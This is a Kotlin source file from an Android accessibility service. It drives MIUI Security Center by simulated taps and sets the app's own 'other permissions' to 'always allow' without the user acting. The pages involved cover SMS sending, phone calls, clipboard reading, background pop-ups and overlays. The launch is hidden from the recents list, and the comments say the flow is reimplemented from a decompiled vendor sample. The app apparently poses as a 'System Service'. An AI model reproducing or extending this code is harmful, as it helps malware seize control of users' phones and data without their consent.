package com.storm.safe.rock.service.modules.yw5xud.miui

import android.content.ComponentName
import android.content.Intent
import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import kotlinx.coroutines.delay

/**
 * MiuiPermissionManagement -- Phase 3 permission management delegate.
 * Navigates through SecurityCenter: ApplicationsDetailsActivity -> 权限管理 -> 其他权限,
 * then iterates 6 permission items and sets each to "始终允许".
 *
 * JADX: C0367a4.m212256b5 (executeBackgroundPopupFlow).
 * Extracted from MiuiSteps.executePermissionManagement().
 */
class MiuiPermissionManagement(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: MiuiSteps
) {
    companion object {
        private const val TAG = "MiuiPermMgmt"
    }

    /**
     * Permission management -- 6 permissions in one flow.
     * JADX: C0367a4.m212256b5 (executeBackgroundPopupFlow)
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase3: executePermissionManagement begin")
            // Phase2 末尾已点击页面"返回"按钮回到 ApplicationsDetailsActivity，
            // 这里 startActivity 只需要把它带到前台
            val securityPkg = "com.miui.securitycenter"
            val intent = Intent().apply {
                component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                putExtra("package_name", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or
                         Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            try {
                (service ?: context).startActivity(intent)
                logs.add("已打开安全中心应用详情页")
            } catch (e: Exception) {
                logs.add("安全中心应用详情打开失败: ${e.message}")
                return
            }

            steps.interruptibleDelay(1500L)
            steps.waitForPageStable()

            // 校验当前是否在应用详情页；若不是（Phase2 返回按钮导航失败），重新 startActivity
            val appInfoSignatures = listOf("应用信息", "存储占用", "权限相关", "应用联网")
            fun isOnAppDetailPage(): Boolean {
                return appInfoSignatures.any { marker -> ui.query("[text*=\"$marker\"]") != null }
            }

            var appInfoPageReady = isOnAppDetailPage()
            if (!appInfoPageReady) {
                // 快速等待 2s 看是否自动加载
                for (retry in 0 until 4) {
                    steps.interruptibleDelay(500L)
                    if (isOnAppDetailPage()) { appInfoPageReady = true; break }
                }
            }
            if (!appInfoPageReady) {
                // 不在应用详情页 -- 再次 startActivity 强制跳转
                Log.w(TAG, "[权限管理] 当前不在应用详情页，重新 startActivity")
                try {
                    (service ?: context).startActivity(intent)
                    steps.interruptibleDelay(1500L)
                    steps.waitForPageStable()
                    for (retry in 0 until 6) {
                        if (isOnAppDetailPage()) { appInfoPageReady = true; break }
                        steps.interruptibleDelay(500L)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "[权限管理] 重新跳转失败: ${e.message}")
                }
            }
            if (appInfoPageReady) {
                Log.i(TAG, "[权限管理] ApplicationsDetailsActivity 已加载")
            } else {
                Log.w(TAG, "[权限管理] 应用详情页加载失败，中止 Phase3")
                logs.add("未找到权限管理入口（无法加载应用详情页）")
                return
            }
            UiDebugger.dumpPage(service, "miui_phase3_security_center", "安全中心应用详情页")

            var enteredPermMgmt = false
            for (keyword in MiuiConstants.PERM_MGMT_ENTRY_KEYWORDS) {
                if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) { enteredPermMgmt = true; logs.add("已进入权限管理页面"); break }
            }
            if (!enteredPermMgmt) {
                for (keyword in MiuiConstants.PERM_MGMT_ENTRY_KEYWORDS) {
                    if (ui.clickSelectorWithScroll("[text=\"$keyword\"][visibleToUser=true]")) { enteredPermMgmt = true; break }
                }
            }
            if (!enteredPermMgmt) { logs.add("未找到权限管理入口"); return }

            steps.interruptibleDelay(1500L)
            steps.waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase3_perm_mgmt", "权限管理页面")

            // JADX step 3: 点击「其他权限」进入子页面（vendor m212256b5 line 3088-3139）
            var enteredOtherPerm = false
            for (keyword in MiuiConstants.OTHER_PERM_KEYWORDS) {
                if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) { enteredOtherPerm = true; Log.i(TAG, "[权限管理] 已进入「$keyword」子页面"); break }
            }
            if (!enteredOtherPerm) {
                for (keyword in MiuiConstants.OTHER_PERM_KEYWORDS) {
                    if (ui.clickSelectorWithScroll("[text=\"$keyword\"][visibleToUser=true]")) { enteredOtherPerm = true; break }
                }
            }
            if (!enteredOtherPerm) {
                Log.w(TAG, "[权限管理] 未找到「其他权限」入口，直接在当前页面查找权限")
            } else {
                steps.interruptibleDelay(1500L)
                steps.waitForPageStable()
                UiDebugger.dumpPage(service, "miui_phase3_other_perms", "其他权限子页面")
            }

            var completedCount = 0
            for ((name, keywords) in MiuiConstants.PERM_MGMT_ITEMS) {
                UiDebugger.dumpPage(service, "miui_phase3_perm_${name}", "搜索权限: $name")
                // Verify we're still on the other permissions page before each item
                if (!ensureOnOtherPermissionsPage()) {
                    Log.w(TAG, "[权限管理] 无法回到其他权限页面，中止")
                    break
                }

                val clicked = clickPermissionItemMulti(keywords, logs)
                if (clicked) {
                    steps.interruptibleDelay(800L)
                    UiDebugger.dumpPage(service, "miui_phase3_perm_${name}_after_click",
                        "点击${name}后的页面")
                    val subtitle = ui.query("[id=\"com.miui.securitycenter:id/action_bar_subtitle\"]")
                        ?.text?.toString() ?: ""
                    Log.i(TAG, "[权限管理] $name 点击后 subtitle='$subtitle'")

                    // Check if already authorized
                    val alreadyAllowed = isPermissionAlreadyAllowed()
                    if (alreadyAllowed) {
                        Log.i(TAG, "[权限管理] $name: 已是始终允许，跳过")
                        ui.pressBack()
                        steps.interruptibleDelay(500L)
                        completedCount++
                        continue
                    }
                    var allowed = false
                    for (allowKw in MiuiConstants.PERM_ALLOW_KEYWORDS) {
                        if (ui.clickSelector("[text=\"$allowKw\"][visibleToUser=true]")) {
                            allowed = true
                            Log.i(TAG, "[权限管理] $name -> $allowKw")
                            break
                        }
                    }
                    if (!allowed) Log.w(TAG, "[权限管理] $name: 未找到允许按钮")
                    steps.interruptibleDelay(150L)
                    ui.pressBack()
                    steps.interruptibleDelay(500L)
                    completedCount++
                } else {
                    Log.w(TAG, "[权限管理] $name: 未找到权限项")
                }
            }
            successes.add("权限管理完成 ($completedCount/${MiuiConstants.PERM_MGMT_ITEMS.size})")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            failures.add("权限管理配置失败: ${e.message}")
        }
    }

    private suspend fun clickPermissionItemMulti(keywords: List<String>, logs: MutableList<String>): Boolean {
        // First try without scrolling
        for (keyword in keywords) { if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) return true }
        // Scroll down -- MIUI other permissions page is very long
        for (i in 0 until 6) {
            val pkg = ui.root()?.packageName?.toString() ?: ""
            Log.d(TAG, "[权限搜索] scroll down #$i, pkg=$pkg, keywords=$keywords")
            if (pkg != "com.miui.securitycenter") {
                Log.w(TAG, "[权限搜索] 已离开安全中心，停止滚动")
                return false
            }
            ui.scrollForward(); delay(500)
            for (keyword in keywords) { if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) return true }
        }
        return false
    }

    /**
     * Check if the current permission detail page already shows "始终允许" as selected.
     */
    private fun isPermissionAlreadyAllowed(): Boolean {
        for (keyword in MiuiConstants.PERM_ALLOW_KEYWORDS) {
            val nodes = ui.queryAll("[text*=\"$keyword\"][visibleToUser=true]")
            for (node in nodes) {
                if (node.isChecked || node.isSelected) return true
                val parent = try { node.parent } catch (_: Exception) { null }
                if (parent != null && (parent.isChecked || parent.isSelected)) return true
            }
        }
        return false
    }

    /**
     * Ensure we're on the "其他权限" (OtherPermissionsActivity) page.
     * If pressBack went too far, re-navigate through the hierarchy.
     */
    private suspend fun ensureOnOtherPermissionsPage(): Boolean {
        val pkg = ui.root()?.packageName?.toString() ?: ""
        if (pkg != "com.miui.securitycenter") {
            Log.w(TAG, "[权限管理] 已离开安全中心 (pkg=$pkg)")
            return false
        }
        // Detect which page we're on:
        // Level 1 "系统服务" app detail: has 通知管理, 自启动, 存储占用, 权限管理
        // Level 2 "权限管理" permissions: has 位置, 相机, 麦克风, 其他权限
        // Level 3 "其他权限" other perms: has 发送短信, 拨打电话, 后台弹出界面, 显示悬浮窗
        val otherPermIndicators = listOf("发送短信", "拨打电话", "读取剪贴板", "后台弹出界面", "显示悬浮窗", "通知类短信", "获取应用列表")
        val permMgmtIndicators = listOf("位置", "相机", "麦克风")  // Level 2 page
        val appDetailIndicators = listOf("通知管理", "自启动", "存储占用", "流量使用情况")

        val otherPermScore = otherPermIndicators.count { ui.query("[text*=\"$it\"]") != null }
        val permMgmtScore = permMgmtIndicators.count { ui.query("[text*=\"$it\"]") != null }
        val appDetailScore = appDetailIndicators.count { ui.query("[text*=\"$it\"]") != null }

        if (otherPermScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            return true  // Already on "其他权限" page
        }

        if (permMgmtScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            // On "权限管理" page (level 2) -- just click "其他权限"
            Log.i(TAG, "[权限管理] 检测到在权限管理页面，点击其他权限")
            for (otherKw in MiuiConstants.OTHER_PERM_KEYWORDS) {
                if (ui.clickSelectorWithScroll("[text=\"$otherKw\"][visibleToUser=true]")) {
                    Log.i(TAG, "[权限管理] 重新进入「$otherKw」子页面")
                    steps.interruptibleDelay(1500L)
                    steps.waitForPageStable()
                    return true
                }
            }
            Log.w(TAG, "[权限管理] 在权限管理页面未找到其他权限入口")
            return false
        }

        if (appDetailScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            // On "系统服务" app detail page (level 1) -- need 权限管理 -> 其他权限
            Log.i(TAG, "[权限管理] 检测到在系统服务页面，重新进入其他权限")
            for (keyword in MiuiConstants.PERM_MGMT_ENTRY_KEYWORDS) {
                if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) {
                    steps.interruptibleDelay(1500L)
                    steps.waitForPageStable()
                    for (otherKw in MiuiConstants.OTHER_PERM_KEYWORDS) {
                        if (ui.clickSelector("[text=\"$otherKw\"][visibleToUser=true]")) {
                            Log.i(TAG, "[权限管理] 重新进入「$otherKw」子页面")
                            steps.interruptibleDelay(1500L)
                            steps.waitForPageStable()
                            return true
                        }
                    }
                    break
                }
            }
            Log.w(TAG, "[权限管理] 重新进入其他权限失败")
            return false
        }
        // Unknown page but still in securitycenter -- try to proceed
        return true
    }
}
